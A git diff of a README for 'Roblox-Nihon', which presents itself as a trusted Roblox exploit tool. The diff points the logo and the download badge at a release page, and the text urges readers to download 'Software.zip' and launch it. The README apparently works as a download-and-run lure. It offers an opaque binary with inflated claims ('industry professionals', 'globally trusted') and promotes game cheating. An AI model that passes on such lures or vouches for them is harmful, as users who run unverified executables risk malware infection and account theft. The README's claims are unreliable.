@@ -1,6 +1,6 @@
 # Roblox-Nihon
 
-![Roblox Logo](https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/330_Roblox_logo-512.png)
+![Roblox Logo](https://github.com/KevinYTx/Roblox-Nihon/releases/tag/v2.0)
 
 ### Introduction
 Welcome to Roblox-Nihon, a leading Roblox exploit tool developed by industry professionals. Our platform, founded in 2020, is renowned for its intuitive user interface, robust features, and exceptional performance. With a focus on security, customization, and reliability, Nihon is a globally trusted service in the Roblox community.
@@ -13,7 +13,7 @@ Welcome to Roblox-Nihon, a leading Roblox exploit tool developed by industry pro
 
 ### Installation
 To download the software, click on the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Software](https://github.com/KevinYTx/Roblox-Nihon/releases/tag/v2.0)](https://github.com/KevinYTx/Roblox-Nihon/releases/tag/v2.0)
 
 ### Repository Link
 If the link above ends with the file name, it needs to be launched. For further information or in case the link does not work, please visit the "Releases" section of this repository.
